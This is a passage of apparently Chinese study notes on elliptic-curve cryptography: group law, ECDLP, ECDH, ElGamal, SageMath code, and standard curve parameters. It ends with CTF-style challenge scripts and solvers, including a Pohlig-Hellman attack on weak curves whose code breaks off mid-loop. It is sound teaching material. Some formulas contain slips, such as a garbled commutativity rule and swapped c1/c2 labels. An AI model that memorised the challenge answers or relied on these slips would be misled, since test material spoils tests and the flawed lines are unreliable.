<p>以下是求解的 python 实现</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">get_points</span>(<span class="params">p, a, b</span>):</span><br><span class="line">    <span class="keyword">return</span> [(x, y) <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(p) <span class="keyword">for</span> y <span class="keyword">in</span> <span class="built_in">range</span>(p) <span class="keyword">if</span> (y*y - (x*x*x + a*x + b)) % p == <span class="number">0</span>]</span><br></pre></td></tr></table></figure>
<h2 id="椭圆曲线上的群操作">椭圆曲线上的群操作</h2>
<p>设点 <span class="math inline">\(P=(x_1,y_1)\)</span> 和 <span class="math inline">\(Q=(x_2,y_2)\)</span>，我们需要计算第三个点<span class="math inline">\(R\)</span>的坐标，使得 <span class="math display">\[
P+Q=R\\
(x_1,y_1)+(x_2,y_2)=(x_3,y_3)
\]</span>
在这里我们只关注<strong>素数域</strong>上的加法法则，得到以下表达式
<span class="math display">\[
x_3=s^2-x_1-x_2\pmod{p}\\
y_3=s(x_1-x_3)-y_1\pmod{p}
\]</span> 其中 <span class="math display">\[
s=\begin{cases}
\displaystyle\frac{y_2-y_1}{x_2-x_1}\pmod{p};\ 当P\neq Q(相异点相加)\\
\displaystyle\frac{3x_1^2+a}{2y_1}\pmod{p};\ 当P=Q(相同点相加)
\end{cases}
\]</span> 在相异点加法中，参数<span class="math inline">\(s\)</span>指的是经过<span class="math inline">\(P\)</span>和<span class="math inline">\(Q\)</span>的直线的斜率；而在相同点加法中，参数<span class="math inline">\(s\)</span>指的是经过点<span class="math inline">\(P\)</span>的切线的斜率。</p>
<p>从几何角度上定义，即作过 <span class="math inline">\(P,Q\)</span>
两点的直线，与椭圆曲线交于第三点 <span class="math inline">\(R\)</span>，取 <span class="math inline">\(R\)</span> 的与 <span class="math inline">\(x\)</span> 轴对称的点（即将 <span class="math inline">\(R\)</span> 的 Y 坐标乘以 -1），得到二点相加的结果
<span class="math inline">\(R&#39;\)</span> 点。</p>
<figure>
<img src="/ecc-note/The%20addition%20law%20on%20an%20elliptic%20curve.png" alt="The addition law on an elliptic curve">
<figcaption aria-hidden="true">The addition law on an elliptic
curve</figcaption>
</figure>
<p>当 <span class="math inline">\(P=Q\)</span>
时，需要采用极限的思想，此时应该是在椭圆曲线上过 <span class="math inline">\(P\)</span> 点的切线与椭圆曲线的交点为二倍点。</p>
<figure>
<img src="/ecc-note/Adding%20a%20point%20P%20to%20itself.png" alt="Adding a point P to itself">
<figcaption aria-hidden="true">Adding a point P to itself</figcaption>
</figure>
<p>定义点 <span class="math inline">\(O\)</span>
为无穷远点，椭圆曲线上一点的运算满足以下规则（<span class="math inline">\(P,Q,R\in E\)</span>）： <span class="math display">\[
P+O=O+P=P\\
P+(-P)=O\\
(P+Q)+R=P+(Q+R)\\
P+Q+Q+P
\]</span> 同时定义倍乘为 <span class="math display">\[
n P=\underbrace{P+P+P+\cdots+P}_{n \text { copies }}
\]</span></p>
<p>而椭圆曲线的阶（order）定义为，找到一个最小的 <span class="math inline">\(s\)</span> 满足 <span class="math inline">\(s=|k-j|\)</span>，其中 <span class="math inline">\(kP=jP\)</span>。</p>
<h2 id="ecdlp-椭圆曲线离散对数问题">ECDLP 椭圆曲线离散对数问题</h2>
<p>首先已知存在定理：</p>
<blockquote>
<p>曲线上的点 <span class="math inline">\(\partial\)</span>
一起构成了循环子群。在某些条件下，椭圆曲线上的所有点可以形成一个循环群。</p>
</blockquote>
<p>在建立 <span class="math inline">\(DL\)</span>
密码体制时，知道群的阶至关重要，我们可以根据 <strong>Hasse's
定理</strong>了解它的大概数量：</p>
<blockquote>
<p>给定一个椭圆曲线<span class="math inline">\(Ep\)</span>，曲线上点的个数表示为<span class="math inline">\(\#E\)</span>，并且在以下范围内： <span class="math display">\[
p+1-2\sqrt{p}\leq \#E\leq p+1+2\sqrt{p}
\]</span></p>
</blockquote>
<p><strong>Hasse's 定理</strong>也称为<strong>Hasse's
边界</strong>，它说明了点的个数大概在素数 <span class="math inline">\(p\)</span>
的范围内。这个结论具有非常大的实用性。例如，如果需要一个拥有 <span class="math inline">\(2^{160}\)</span>
个元素的椭圆曲线，我们必须使用一个长度大约为 160 位的素数。</p>
<p>以下给出椭圆曲线离散对数问题（ECDLP）的定义：</p>
<blockquote>
<p>给定一个椭圆曲线 <span class="math inline">\(E\)</span>，考虑本原
<span class="math inline">\(P\)</span> 和另一个元素 <span class="math inline">\(Q\)</span>。则 <span class="math inline">\(DL\)</span> 问题是找到整数<span class="math inline">\(k(1\leq k\leq \#E)\)</span>，满足： <span class="math display">\[
kP=Q
\]</span> 记为 <span class="math display">\[
k=\log_P{(Q)}
\]</span></p>
</blockquote>
<p>其中，椭圆曲线加密的数学原理：</p>
<blockquote>
<p>点<span class="math inline">\(P\)</span>称为基点（base point）；<span class="math inline">\(k\)</span>为私有密钥（private key）；<span class="math inline">\(Q\)</span>为公开密钥（public key）</p>
<ul>
<li>若给定<span class="math inline">\(k\)</span>和<span class="math inline">\(P\)</span>，根据加法法则，计算<span class="math inline">\(Q\)</span>很容易。</li>
<li>但给定<span class="math inline">\(P\)</span>和<span class="math inline">\(Q\)</span>，求<span class="math inline">\(k\)</span>非常困难 (实际应用 ECC 时，素数<span class="math inline">\(p\)</span>会取得非常大，穷举出<span class="math inline">\(k\)</span>将十分困难)</li>
</ul>
</blockquote>
<p>其中椭圆离散对数满足以下运算： <span class="math display">\[
\log_P{(Q_1+Q_2)}=\log_P(Q_1)+\log_P(Q_2);Q_1,Q_2\in E
\]</span> 目前已知最快的解决椭圆离散对数问题的算法大约需要在 <span class="math inline">\(\sqrt{p}\)</span> 步，所以当 <span class="math inline">\(p\)</span> 足够大时，椭圆曲线加密具有安全性。</p>
<h2 id="基于椭圆曲线的-diffie-hellman-密钥交换">基于椭圆曲线的
Diffie-Hellman 密钥交换</h2>
<p>首先我们必须统一域参数，即实现所需要的合适的椭圆曲线以及曲线上的一个本原元：</p>
<p><strong>ECDH 域参数</strong></p>
<blockquote>
<ul>
<li>选择一个素数<span class="math inline">\(p\)</span>和椭圆曲线</li>
</ul>
<p><span class="math display">\[
E:y^2\equiv x^3+ax+b\pmod{p}
\]</span></p>
<ul>
<li>选择一个本原元<span class="math inline">\(P=(x_p,y_p)\)</span></li>
</ul>
<p>素数<span class="math inline">\(p\)</span>、由系数<span class="math inline">\(a\)</span>和<span class="math inline">\(b\)</span>给出的曲线以及本原元<span class="math inline">\(P\)</span>都是域参数。</p>
</blockquote>
<p>请注意：实际上找到一个合适的椭圆曲线是一项比较困难的任务。</p>
<p><strong>椭圆曲线 Diffie-Hellman 密钥交换 (ECDH)</strong></p>
<blockquote>
<p>对于 <strong>Alice</strong>：</p>
<p>​ 选择 <span class="math inline">\(k_{prA}=a\in
\{2,3,...,\#E-1\}\)</span></p>
<p>​ 计算 <span class="math inline">\(k_{pubA}=aP=A=(x_A,y_A)\)</span></p>
<p>对于 <strong>Bob</strong>：</p>
<p>​ 选择 <span class="math inline">\(k_{prB}=b\in
\{2,3,...,\#E-1\}\)</span></p>
<p>​ 计算 <span class="math inline">\(k_{pubB}=bP=B=(x_B,y_B)\)</span></p>
<p>交换 <strong>Alice</strong> 和 <strong>Bob</strong> 的密钥 <span class="math inline">\(A,B\)</span></p>
<p>对于 <strong>Alice</strong> 来说：</p>
<p>​ 计算 <span class="math inline">\(aB=T_{AB}\)</span></p>
<p>对于 <strong>Bob</strong> 来说：</p>
<p>​ 计算 <span class="math inline">\(bA=T_{AB}\)</span></p>
<p>故 <strong>Alice</strong> 和 <strong>Bob</strong>
之间的联合密钥：<span class="math inline">\(T_{AB}=(x_{AB},
y_{AB})\)</span></p>
</blockquote>
<h2 id="elgamal-加密算法">ElGamal 加密算法</h2>
<h3 id="密钥生成">密钥生成</h3>
<p>选择一个素数 <span class="math inline">\(p\)</span> 以及两个小于
<span class="math inline">\(p\)</span> 的随机数 <span class="math inline">\(g\)</span> 和 <span class="math inline">\(x\)</span>，计算 <span class="math display">\[
y=g^x\pmod{p}
\]</span> 以 <span class="math inline">\((y,g,p)\)</span> 作为公开密钥
(public key)，<span class="math inline">\(x\)</span> 作为私有密钥
(private key)</p>
<h3 id="加密">加密</h3>
<p>明文消息为<span class="math inline">\(m\)</span>，随机选取一个与<span class="math inline">\(p-1\)</span>互素的整数<span class="math inline">\(k\)</span>，计算 <span class="math display">\[
c_1=g^k\pmod{p}\\
c_2=my^k\pmod{p}
\]</span> 密文为<span class="math inline">\(C=(c_1,c_2)\)</span></p>
<h3 id="解密">解密</h3>
<p><span class="math display">\[
m=\frac{c_2}{c_1}\pmod{p}
\]</span></p>
<p>因为 <span class="math display">\[
\frac{c_2}{c_1}mod\ p=\frac{my^k}{g^{kx}}mod\ p=\frac{my^k}{y^k}mod\
p=m\pmod{p}
\]</span></p>
<h2 id="ec-elgamal">EC ElGamal</h2>
<h3 id="密钥生成-1">密钥生成</h3>
<p>选一条素数域椭圆曲线，得 <span class="math inline">\(E_p(a,b)\)</span>，将明文信息<span class="math inline">\(m\)</span>嵌入到曲线上的点<span class="math inline">\(P_m\)</span>，再对点<span class="math inline">\(P_m\)</span>做加密变换。</p>
<p>取 <span class="math inline">\(E_p(a,b)\)</span> 的一个生成元 <span class="math inline">\(G\)</span>，<span class="math inline">\(E_p(a,b)\)</span> 和 <span class="math inline">\(G\)</span> 作为公开参数。用户 A 选则随机整数</p>
<blockquote>
<p><span class="math inline">\(n_A\)</span> 作为密钥 (private key)，以
<span class="math inline">\(P_A=n_AG\)</span> 作为公钥 (public key)</p>
</blockquote>
<h3 id="加密-1">加密</h3>
<p>用户B向用户A发送消息 <span class="math inline">\(P_m\)</span>，选取一个随机正整数 <span class="math inline">\(k\)</span>，产生以下点对作为密文： <span class="math display">\[
C_m=\{kG,P_m+kP_A\}
\]</span></p>
<h3 id="解密-1">解密</h3>
<p>以密文对中的第二个点减去自己的密钥与第一个点的点乘，即 <span class="math display">\[
P_m+kP_A-n_AkG=P_m+k(n_AG)-n_AkG=P_m
\]</span></p>
<h1 id="eccsagemath-实现">ECC&amp;sagemath 实现</h1>
<h2 id="加密-2">加密</h2>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 获取素数 p, a, b</span></span><br><span class="line">p = random_prime(<span class="number">1</span> &lt;&lt; <span class="number">257</span>, <span class="literal">False</span>, <span class="number">1</span> &lt;&lt; <span class="number">256</span>)</span><br><span class="line">a = random_prime(<span class="number">1</span> &lt;&lt; <span class="number">257</span>, <span class="literal">False</span>, <span class="number">1</span> &lt;&lt; <span class="number">256</span>)</span><br><span class="line">b = random_prime(<span class="number">1</span> &lt;&lt; <span class="number">257</span>, <span class="literal">False</span>, <span class="number">1</span> &lt;&lt; <span class="number">256</span>)</span><br><span class="line"><span class="comment"># 构造在素数p域上的椭圆曲线</span></span><br><span class="line">E = EllipticCurve(GF(p),[a,b])</span><br><span class="line"><span class="comment"># 假设 m 点为我们的明文</span></span><br><span class="line">m = E.random_point()</span><br><span class="line"><span class="comment"># 获取基点</span></span><br><span class="line">G = E.random_point()</span><br><span class="line"><span class="comment"># 得到私钥 k</span></span><br><span class="line">k = random_prime(<span class="number">1</span> &lt;&lt; <span class="number">257</span>, <span class="literal">False</span>, <span class="number">1</span> &lt;&lt; <span class="number">256</span>)</span><br><span class="line"><span class="comment"># 得到公钥</span></span><br><span class="line">K = k * G</span><br><span class="line"><span class="comment"># 使用随机整数 r 进行加密，得到密文 c1, c2</span></span><br><span class="line">r = random_prime(<span class="number">1</span> &lt;&lt; <span class="number">257</span>, <span class="literal">False</span>, <span class="number">1</span> &lt;&lt; <span class="number">256</span>)</span><br><span class="line">c1 = m + r*K</span><br><span class="line">c2 = r*G</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;p = <span class="subst">&#123;p&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;a = <span class="subst">&#123;a&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;b = <span class="subst">&#123;b&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;k = <span class="subst">&#123;k&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;c1 = <span class="subst">&#123;c1&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;c2 = <span class="subst">&#123;c2&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;m = <span class="subst">&#123;m&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure>
<p>Output</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">p = <span class="number">128793297744506472538564656403224353239237790297856868063135293480657949718107</span></span><br><span class="line">a = <span class="number">169525633276763035731120099301596679606634597125967649372511273475112363403657</span></span><br><span class="line">b = <span class="number">198042220010210729246139661419765709873418351966965680886669963511628185483527</span></span><br><span class="line">k = <span class="number">206223544016520338020994485092105731388506670455347138071664112683983647251049</span></span><br><span class="line">c1 = (<span class="number">120774540425763335415920992448661415223098467838556300826760573949754740635371</span> : <span class="number">31715597141680277543788087553074283575900846707702192323467421200922884354981</span> : <span class="number">1</span>)</span><br><span class="line">c2 = (<span class="number">25578971254124014433500544217127701457691693095066572228632002958021823241423</span> : <span class="number">105137323155370344541775539884363939121440305371187190617792029879165314583114</span> : <span class="number">1</span>)</span><br><span class="line">m = (<span class="number">52087445795594278491856078932932443344636991761169005384048985847142638285440</span> : <span class="number">15902591507684804608199095029425478914739638495574120728111164694188566421928</span> : <span class="number">1</span>)</span><br></pre></td></tr></table></figure>
<h2 id="解密-2">解密</h2>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 构造在素数p域上的椭圆曲线</span></span><br><span class="line">p = <span class="number">128793297744506472538564656403224353239237790297856868063135293480657949718107</span></span><br><span class="line">a = <span class="number">169525633276763035731120099301596679606634597125967649372511273475112363403657</span></span><br><span class="line">b = <span class="number">198042220010210729246139661419765709873418351966965680886669963511628185483527</span></span><br><span class="line">E = EllipticCurve(GF(p),[a,b])</span><br><span class="line"><span class="comment"># 私钥</span></span><br><span class="line">k = <span class="number">206223544016520338020994485092105731388506670455347138071664112683983647251049</span></span><br><span class="line"><span class="comment"># 密文点对</span></span><br><span class="line">c1 = E(<span class="number">120774540425763335415920992448661415223098467838556300826760573949754740635371</span>, <span class="number">31715597141680277543788087553074283575900846707702192323467421200922884354981</span>)</span><br><span class="line">c2 = E(<span class="number">25578971254124014433500544217127701457691693095066572228632002958021823241423</span>, <span class="number">105137323155370344541775539884363939121440305371187190617792029879165314583114</span>)</span><br><span class="line"><span class="comment"># 解密</span></span><br><span class="line">m = c1-k*c2</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;m = <span class="subst">&#123;m&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure>
<p>Output</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">m = (<span class="number">52087445795594278491856078932932443344636991761169005384048985847142638285440</span> : <span class="number">15902591507684804608199095029425478914739638495574120728111164694188566421928</span> : <span class="number">1</span>)</span><br></pre></td></tr></table></figure>
<h1 id="eccpython-实现">ECC&amp;Python 实现</h1>
<h2 id="生成-ecc-密钥">生成 ECC 密钥</h2>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.PublicKey <span class="keyword">import</span> ECC</span><br><span class="line"></span><br><span class="line"><span class="comment">#生成ECC密钥</span></span><br><span class="line">key = ECC.generate(curve=<span class="string">&#x27;NIST P-256&#x27;</span>) <span class="comment">#使用椭圆曲线NIST P-256</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#输出密钥（包括私钥k，基点G）</span></span><br><span class="line"><span class="built_in">print</span>(key)</span><br><span class="line"></span><br><span class="line"><span class="comment">#公钥（point_x，point_y是基点G的坐标）</span></span><br><span class="line"><span class="built_in">print</span>(key.public_key())</span><br><span class="line"></span><br><span class="line"><span class="comment">#椭圆曲线</span></span><br><span class="line"><span class="built_in">print</span>(key.curve)</span><br><span class="line"></span><br><span class="line"><span class="comment">#私钥k</span></span><br><span class="line"><span class="built_in">print</span>(key.d)</span><br><span class="line"></span><br><span class="line"><span class="comment">#导出为pem密钥文件</span></span><br><span class="line"><span class="built_in">print</span>(key.export_key(<span class="built_in">format</span>=<span class="string">&#x27;PEM&#x27;</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment">#导入密钥文件</span></span><br><span class="line">key = ECC.import_key(f.read())</span><br></pre></td></tr></table></figure>
<h2 id="查询公开椭圆曲线参数">查询公开椭圆曲线参数</h2>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> fastecdsa.curve <span class="keyword">as</span> curve</span><br><span class="line"></span><br><span class="line"><span class="comment">#P-384的a</span></span><br><span class="line">curve.P384.a</span><br><span class="line"></span><br><span class="line"><span class="comment">#P-384的b</span></span><br><span class="line">curve.P384.b</span><br><span class="line"></span><br><span class="line"><span class="comment">#P-384的p</span></span><br><span class="line">curve.P384.p</span><br></pre></td></tr></table></figure>
<h1 id="ecc已公开椭圆曲线参数">ECC已公开椭圆曲线参数</h1>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#NIST P-256（Secp256r1）</span></span><br><span class="line"><span class="comment">#p = 2^224(2^32 − 1) + 2^192 + 2^96 − 1</span></span><br><span class="line">p = <span class="number">115792089210356248762697446949407573530086143415290314195533631308867097853951</span></span><br><span class="line">a = <span class="number">115792089210356248762697446949407573530086143415290314195533631308867097853948</span></span><br><span class="line">b = <span class="number">41058363725152142129326129780047268409114441015993725554835256314039467401291</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#Secp256k1（比特币使用）</span></span><br><span class="line"><span class="comment">#p = 2^256 − 2^32 − 2^9 − 2^8 − 2^7 − 2^6 − 2^4 − 1 = 2^256 – 2^32 – 977 </span></span><br><span class="line">p = <span class="number">115792089237316195423570985008687907853269984665640564039457584007908834671663</span></span><br><span class="line">a = <span class="number">0</span></span><br><span class="line">b = <span class="number">7</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#NIST P-384</span></span><br><span class="line"><span class="comment">#p = 2^384 – 2^128 – 2^96 + 2^32 – 1</span></span><br><span class="line">p = <span class="number">39402006196394479212279040100143613805079739270465446667948293404245721771496870329047266088258938001861606973112319</span></span><br><span class="line">a = -<span class="number">3</span></span><br><span class="line">b = <span class="number">27580193559959705877849011840389048093056905856361568521428707301988689241309860865136260764883745107765439761230575</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#NIST P-521</span></span><br><span class="line">p = <span class="number">6864797660130609714981900799081393217269435300143305409394463459185543183397656052122559640661454554977296311391480858037121987999716643812574028291115057151</span></span><br><span class="line">a = -<span class="number">3</span></span><br><span class="line">b = <span class="number">1093849038073734274511112390766805569936207598951683748994586394495953116150735016013708737573759623248592132296706313309438452531591012912142327488478985984</span></span><br></pre></td></tr></table></figure>
<h1 id="ecc-求解">ECC 求解</h1>
<h2 id="普通明文映射">普通明文映射</h2>
<p>task.sage</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> getPrime</span><br><span class="line"><span class="keyword">from</span> libnum <span class="keyword">import</span> s2n</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line"></span><br><span class="line">p = getPrime(<span class="number">256</span>)</span><br><span class="line">a = getPrime(<span class="number">256</span>)</span><br><span class="line">b = getPrime(<span class="number">256</span>)</span><br><span class="line">E = EllipticCurve(GF(p),[a,b])</span><br><span class="line">m = E.random_point()</span><br><span class="line">G = E.random_point()</span><br><span class="line">k = getPrime(<span class="number">256</span>)</span><br><span class="line">K = k * G</span><br><span class="line">r = getPrime(<span class="number">256</span>)</span><br><span class="line">c1 = m + r * K</span><br><span class="line">c2 = r * G</span><br><span class="line">cipher_left = s2n(flag[:<span class="built_in">len</span>(flag)//<span class="number">2</span>]) * m[<span class="number">0</span>]</span><br><span class="line">cipher_right = s2n(flag[<span class="built_in">len</span>(flag)//<span class="number">2</span>:]) * m[<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;p = <span class="subst">&#123;p&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;a = <span class="subst">&#123;a&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;b = <span class="subst">&#123;b&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;k = <span class="subst">&#123;k&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;E = <span class="subst">&#123;E&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;c1 = <span class="subst">&#123;c1&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;c2 = <span class="subst">&#123;c2&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;cipher_left = <span class="subst">&#123;cipher_left&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;cipher_right = <span class="subst">&#123;cipher_right&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure>
<p>output.txt</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">p = <span class="number">74997021559434065975272431626618720725838473091721936616560359000648651891507</span></span><br><span class="line">a = <span class="number">61739043730332859978236469007948666997510544212362386629062032094925353519657</span></span><br><span class="line">b = <span class="number">87821782818477817609882526316479721490919815013668096771992360002467657827319</span></span><br><span class="line">k = <span class="number">93653874272176107584459982058527081604083871182797816204772644509623271061231</span></span><br><span class="line">E = Elliptic Curve defined by y^<span class="number">2</span> = x^<span class="number">3</span> + <span class="number">61739043730332859978236469007948666997510544212362386629062032094925353519657</span>*x + <span class="number">12824761259043751634610094689861000765081341921946160155432001001819005935812</span> over Finite Field of size <span class="number">74997021559434065975272431626618720725838473091721936616560359000648651891507</span></span><br><span class="line">c1 = (<span class="number">14455613666211899576018835165132438102011988264607146511938249744871964946084</span> : <span class="number">25506582570581289714612640493258299813803157561796247330693768146763035791942</span> : <span class="number">1</span>)</span><br><span class="line">c2 = (<span class="number">37554871162619456709183509122673929636457622251880199235054734523782483869931</span> : <span class="number">71392055540616736539267960989304287083629288530398474590782366384873814477806</span> : <span class="number">1</span>)</span><br><span class="line">cipher_left = <span class="number">68208062402162616009217039034331142786282678107650228761709584478779998734710</span></span><br><span class="line">cipher_right = <span class="number">27453988545002384546706933590432585006240439443312571008791835203660152890619</span></span><br></pre></td></tr></table></figure>
<p>exp.sage</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">p = <span class="number">74997021559434065975272431626618720725838473091721936616560359000648651891507</span></span><br><span class="line">a = <span class="number">61739043730332859978236469007948666997510544212362386629062032094925353519657</span></span><br><span class="line">b = <span class="number">87821782818477817609882526316479721490919815013668096771992360002467657827319</span></span><br><span class="line">k = <span class="number">93653874272176107584459982058527081604083871182797816204772644509623271061231</span></span><br><span class="line">E = EllipticCurve(GF(p),[a,b])</span><br><span class="line">c1 = E(<span class="number">14455613666211899576018835165132438102011988264607146511938249744871964946084</span>, <span class="number">25506582570581289714612640493258299813803157561796247330693768146763035791942</span>)</span><br><span class="line">c2 = E(<span class="number">37554871162619456709183509122673929636457622251880199235054734523782483869931</span>, <span class="number">71392055540616736539267960989304287083629288530398474590782366384873814477806</span>)</span><br><span class="line">cipher_left = <span class="number">68208062402162616009217039034331142786282678107650228761709584478779998734710</span></span><br><span class="line">cipher_right = <span class="number">27453988545002384546706933590432585006240439443312571008791835203660152890619</span></span><br><span class="line">m = c1 - k*c2</span><br><span class="line">cipher_left = cipher_left * inverse_mod(<span class="built_in">int</span>(m[<span class="number">0</span>]), p) % p</span><br><span class="line">cipher_right = cipher_right * inverse_mod(<span class="built_in">int</span>(m[<span class="number">1</span>]), p) % p</span><br><span class="line"><span class="built_in">print</span>(cipher_left, cipher_right)</span><br></pre></td></tr></table></figure>
<h2 id="普通离散对数">普通离散对数</h2>
<blockquote>
<p>以下使用 sagemath，数据量不能太大</p>
</blockquote>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">a = <span class="number">1234577</span></span><br><span class="line">b = <span class="number">3213242</span></span><br><span class="line">p = <span class="number">7654319</span></span><br><span class="line">E = EllipticCurve(GF(p),[a,b])</span><br><span class="line"><span class="comment"># 生成元</span></span><br><span class="line">G = E(<span class="number">5234568</span>, <span class="number">2287747</span>)</span><br><span class="line"><span class="comment"># k = 1584718</span></span><br><span class="line"><span class="comment"># K = k*G</span></span><br><span class="line"><span class="comment"># 公钥</span></span><br><span class="line">K = E(<span class="number">2366653</span>, <span class="number">1424308</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 求解私钥，自动选择bsgs或Pohlig Hellman算法</span></span><br><span class="line">discrete_log(K,G,operation=<span class="string">&#x27;+&#x27;</span>)</span><br><span class="line"><span class="comment"># G.discrete_log(K)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 求解私钥，Pollard rho算法</span></span><br><span class="line">discrete_log_rho(K,G,operation=<span class="string">&#x27;+&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 求解私钥，Pollard Lambda(Pollard kangaroo)算法，能够确定所求值在某一小范围时效率较高</span></span><br><span class="line">discrete_log_lambda(K,G,(<span class="number">1500000</span>,<span class="number">2000000</span>),operation=<span class="string">&#x27;+&#x27;</span>)</span><br></pre></td></tr></table></figure>
<h2 id="pohlig-hellman-攻击">Pohlig-Hellman 攻击</h2>
<h3 id="原理">原理</h3>
<p>我们知道求解离散对数问题已经有较为高效的方法（例如
<code>Pohlig Hellman</code> 算法），而 Pohlig 和 Hellman
提出我们还可以使椭圆离散对数问题的求解变得更加有效率。</p>
<p>他们提出，假设 <span class="math inline">\(n\)</span>
为椭圆曲线的阶，而 <span class="math inline">\(n=p_1^{e_1}p_2^{e_2}\cdots
p_r^{e_r}\)</span>，其中 <span class="math inline">\(p_i,1\leq i\leq
r\)</span> 为质因数，那么我们可以把计算 <span class="math inline">\(l=\log_P{Q}\)</span> 转化为计算每一个 <span class="math inline">\(l_i=l\bmod{p_i^{e_i}}\)</span>，得到一个同余方程组
<span class="math display">\[
\begin{array}{rlr}
l &amp; \equiv l_{1} &amp; \left(\bmod p_{1}^{e_{1}}\right) \\
l &amp; \equiv l_{2} &amp; \left(\bmod p_{2}^{e_{2}}\right) \\
&amp; \ \vdots &amp; \\
l &amp; \equiv l_{r} &amp; \left(\bmod p_{r}^{e_{r}}\right)
\end{array}
\]</span> 使用中国剩余定理，我们就可解 <span class="math inline">\(l=\log_P{Q}\)</span>。</p>
<p>现在的问题转化为求解 <span class="math inline">\(l_i=l\bmod{p_i^{e_i}}\)</span>。</p>
<p>我们首先设 <span class="math inline">\(l_i\)</span> 为一个 <span class="math inline">\(p_i\)</span> 多项式（下面为方便表达，将 <span class="math inline">\(l_i,p_i,e_i\)</span> 的下标忽略）： <span class="math display">\[
l=z_{0}+z_{1} p+z_{2} p^{2}+\cdots+z_{e-1} p^{e-1}
\]</span> 其中 <span class="math inline">\(z_i\in [0,p-1]\)</span>。</p>
<p>计算 <span class="math inline">\(P_0=(n/p)P\)</span>，<span class="math inline">\(Q_0=(n/p)Q\)</span>，有 <span class="math display">\[
Q_0=\frac{n}{p}Q=l(\frac{n}{p}P)=lP_0=z_0P_0
\]</span> 因此 <span class="math inline">\(z_0=\log_{P_0}{Q_0}\)</span>。</p>
<p>同理我们计算 <span class="math inline">\(Q_1=(n/p^2)(Q-z_0P)\)</span>，有 <span class="math display">\[
Q_1=\frac{n}{p^2}(Q-z_0P)=\frac{n}{p^2}(l-z_0)P=(z_0+z_1p-z_0)\frac{n}{p^2}P=z_1P_0
\]</span> 故 <span class="math inline">\(z_1=\log_{P_0}{Q_1}\)</span>。</p>
<p>以此类推，我们可以得 <span class="math inline">\(z_t=\log_{P_0}{Q_t}\)</span>，其中 <span class="math display">\[
Q_t=\frac{n}{p^{t+1}}\left(Q-z_{0} P-z_{1} p P-z_{2} p^{2}
P-\cdots-z_{t-1} p^{t-1} P\right)
\]</span> 除分散为子域计算，Sagemath 的 <code>discrete_log</code>
中已将以上叙述的 Pohlig Hellman 算法（对 <span class="math inline">\(p^k\)</span> 阶的离散对数求解）内置。</p>
<h3 id="代码">代码</h3>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">p = <span class="number">1256438680873352167711863680253958927079458741172412327087203</span></span><br><span class="line">A = <span class="number">377999945830334462584412960368612</span></span><br><span class="line">B = <span class="number">604811648267717218711247799143415167229480</span></span><br><span class="line">E = EllipticCurve(GF(p),[A,B])</span><br><span class="line">P = E(<span class="number">550637390822762334900354060650869238926454800955557622817950</span>, <span class="number">700751312208881169841494663466728684704743091638451132521079</span>)</span><br><span class="line">Q = E(<span class="number">1152079922659509908913443110457333432642379532625238229329830</span>, <span class="number">819973744403969324837069647827669815566569448190043645544592</span>)</span><br><span class="line"></span><br><span class="line">n = E.order()</span><br><span class="line"><span class="comment"># 对于大素数域计算离散对数效率太低，过滤</span></span><br><span class="line">primes = <span class="built_in">list</span>(<span class="built_in">filter</span>(<span class="keyword">lambda</span> x: x &lt; <span class="number">2</span> ** <span class="number">32</span>, (base ** exp <span class="keyword">for</span> base, exp <span class="keyword">in</span> factor(n))))</span><br><span class="line"></span><br><span class="line">dlogs = []</span><br><span class="line"><span class="keyword">for</span> 